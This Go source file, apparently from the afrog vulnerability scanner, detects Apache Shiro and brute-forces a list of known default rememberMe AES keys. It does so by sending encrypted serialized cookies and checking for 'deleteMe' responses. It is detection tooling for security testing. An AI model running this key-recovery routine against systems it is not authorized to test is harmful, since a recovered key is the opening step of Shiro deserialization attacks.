package gox

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"encoding/base64"
	"errors"
	"net/http"
	"net/url"
	"strings"

	"github.com/zan8in/afrog/v3/pkg/proto"
)

var shiroCheckPayload = []byte{
	0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x32, 0x6f, 0x72, 0x67, 0x2e, 0x61, 0x70, 0x61, 0x63,
	0x68, 0x65, 0x2e, 0x73, 0x68, 0x69, 0x72, 0x6f, 0x2e, 0x73, 0x75, 0x62, 0x6a, 0x65, 0x63, 0x74,
	0x2e, 0x53, 0x69, 0x6d, 0x70, 0x6c, 0x65, 0x50, 0x72, 0x69, 0x6e, 0x63, 0x69, 0x70, 0x61, 0x6c,
	0x43, 0x6f, 0x6c, 0x6c, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0xa8, 0x7f, 0x58, 0x25, 0xc6, 0xa3,
	0x08, 0x4a, 0x03, 0x00, 0x01, 0x4c, 0x00, 0x0f, 0x72, 0x65, 0x61, 0x6c, 0x6d, 0x50, 0x72, 0x69,
	0x6e, 0x63, 0x69, 0x70, 0x61, 0x6c, 0x73, 0x74, 0x00, 0x0f, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f,
	0x75, 0x74, 0x69, 0x6c, 0x2f, 0x4d, 0x61, 0x70, 0x3b, 0x78, 0x70, 0x70, 0x77, 0x01, 0x00, 0x78,
}

var shiroDefaultKeys = []string{
	"kPH+bIxk5D2deZiIxcaaaA==",
	"2AvVhdsgUs0FSA3SDFAdag==",
	"3AvVhmFLUs0KTA3Kprsdag==",
	"4AvVhmFLUs0KTA3Kprsdag==",
	"5AvVhmFLUs0KTA3Kprsdag==",
	"6AvVhmFLUs0KTA3Kprsdag==",
	"7AvVhmFLUs0KTA3Kprsdag==",
	"8AvVhmFLUs0KTA3Kprsdag==",
	"9AvVhmFLUs0KTA3Kprsdag==",
	"0AvVhmFLUs0KTA3Kprsdag==",
	"1AvVhdsgUs0FSA3SDFAdag==",
	"4AvVhdsgUs0FSA3SDFAdag==",
	"wGiHplamyXlVB11UXWol8g==",
	"Z3VucwAAAAAAAAAAAAAAAA==",
	"MTIzNDU2Nzg5MGFiY2RlZg==",
	"U3ByaW5nQmxhZGUAAAAAAAAAAAAA",
	"fCq+/xW488hMTCD+cmJ3aQ==",
	"bWljcm9zAAAAAAAAAAAAAA==",
	"bWluZS1hc3NldC1rZXk6QQ==",
	"ZnJhbmsAAAAAAAAAAAAAAAA=",
	"YmxhZGUAAAAAAAAAAAAAAAA=",
	"YWxwaGEAAAAAAAAAAAAAAAA=",
	"a2V5AAAAAAAAAAAAAAAAAAAAAA==",
	"c2hpcm8AAAAAAAAAAAAAAAAA",
	"c2hpcm8tc2VjcmV0LWtleQ==",
}

func shiro_key(target string, variableMap map[string]any) error {
	variableMap["request"] = nil
	variableMap["response"] = nil

	fulltarget, err := shiroNormalizeTarget(target)
	if err != nil {
		return err
	}

	shiroDetected, detReq, detResp, followRedirects, err := shiroDetect(fulltarget)
	if err != nil {
		return err
	}
	if detReq != nil {
		variableMap["request"] = detReq
	}
	if detResp != nil {
		variableMap["response"] = detResp
	}
	setTarget(fulltarget, variableMap)
	setFullTarget(fulltarget, variableMap)

	if !shiroDetected {
		return nil
	}

	for _, keyB64 := range shiroDefaultKeys {
		key, err := base64.StdEncoding.DecodeString(keyB64)
		if err != nil {
			continue
		}

		rememberMe, err := shiroEncryptRememberMeCBC(shiroCheckPayload, key)
		if err != nil {
			continue
		}

		ok, vmap, err := shiroConfirmKey(fulltarget, rememberMe, followRedirects)
		if err != nil {
			continue
		}
		if !ok {
			continue
		}

		if v := vmap["request"]; v != nil {
			variableMap["request"] = v
		}
		if v := vmap["response"]; v != nil {
			variableMap["response"] = v
		}

		setTarget(fulltarget, variableMap)
		setFullTarget(fulltarget, variableMap)

		shiroInjectKeyMarker(variableMap, keyB64)
		return nil
	}

	return nil
}

func shiroNormalizeTarget(target string) (string, error) {
	u, err := url.Parse(target)
	if err != nil {
		return "", err
	}
	if u.Scheme == "" || u.Host == "" {
		return "", errors.New("invalid target")
	}
	if u.Path == "" {
		u.Path = "/"
	}
	return u.String(), nil
}

func shiroDetect(target string) (bool, any, any, bool, error) {
	vmap := make(map[string]any)
	headers := map[string]string{
		"Cookie": "JSESSIONID=" + shiroRandLower(8) + ";rememberMe=123;",
	}
	resp, err := DoHTTP(http.MethodGet, target, nil, headers, true, vmap)
	if err == nil && resp != nil && shiroHasDeleteMe(resp) {
		return true, vmap["request"], vmap["response"], true, nil
	}

	vmap2 := make(map[string]any)
	resp2, err2 := DoHTTP(http.MethodGet, target, nil, headers, false, vmap2)
	if err2 == nil && resp2 != nil && shiroHasDeleteMe(resp2) {
		return true, vmap2["request"], vmap2["response"], false, nil
	}

	if err != nil {
		return false, vmap["request"], vmap["response"], false, nil
	}
	return false, vmap["request"], vmap["response"], false, nil
}

func shiroHasDeleteMe(resp *proto.Response) bool {
	if resp == nil {
		return false
	}
	if sc := strings.ToLower(resp.GetHeaders()["set-cookie"]); strings.Contains(sc, "rememberme=deleteme") {
		return true
	}
	h := strings.ToLower(string(resp.GetRawHeader()))
	return strings.Contains(h, "rememberme=deleteme")
}

func shiroEncryptRememberMeCBC(plaintext []byte, key []byte) (string, error) {
	if len(key) != 16 && len(key) != 24 && len(key) != 32 {
		return "", errors.New("invalid aes key length")
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := crand.Read(iv); err != nil {
		return "", err
	}

	padded, err := shiroPKCS7Pad(plaintext, aes.BlockSize)
	if err != nil {
		return "", err
	}

	out := make([]byte, len(padded))
	cipher.NewCBCEncrypter(block, iv).CryptBlocks(out, padded)
	return base64.StdEncoding.EncodeToString(append(iv, out...)), nil
}

func shiroConfirmKey(target string, rememberMe string, followRedirects bool) (bool, map[string]any, error) {
	headers := map[string]string{
		"Cookie": "rememberMe=" + rememberMe + ";",
	}

	var lastVars map[string]any
	for i := 0; i < 2; i++ {
		vmap := make(map[string]any)
		resp, err := DoHTTP(http.MethodGet, target, nil, headers, followRedirects, vmap)
		if err != nil {
			return false, nil, err
		}
		if resp == nil {
			return false, nil, errors.New("empty response")
		}
		if shiroHasDeleteMe(resp) {
			return false, nil, nil
		}
		lastVars = vmap
	}

	return true, lastVars, nil
}

func shiroPKCS7Pad(in []byte, blockSize int) ([]byte, error) {
	if blockSize <= 0 || blockSize >= 256 {
		return nil, errors.New("invalid block size")
	}
	padLen := blockSize - (len(in) % blockSize)
	if padLen == 0 {
		padLen = blockSize
	}
	padding := bytes.Repeat([]byte{byte(padLen)}, padLen)
	return append(in, padding...), nil
}

func shiroRandLower(n int) string {
	if n <= 0 {
		return ""
	}
	const letters = "abcdefghijklmnopqrstuvwxyz"
	b := make([]byte, n)
	if _, err := crand.Read(b); err != nil {
		for i := range b {
			b[i] = 'a'
		}
		return string(b)
	}
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func shiroInjectKeyMarker(variableMap map[string]any, keyB64 string) {
	marker := []byte("\nShiroKey:" + keyB64)
	if v := variableMap["response"]; v != nil {
		if resp, ok := v.(*proto.Response); ok && resp != nil {
			resp.Raw = append(resp.Raw, marker...)
			resp.Body = append(resp.Body, marker...)
			return
		}
	}
	setResponse("ShiroKey:"+keyB64, variableMap)
}

func init() {
	funcMap["shiro_key"] = shiro_key
}
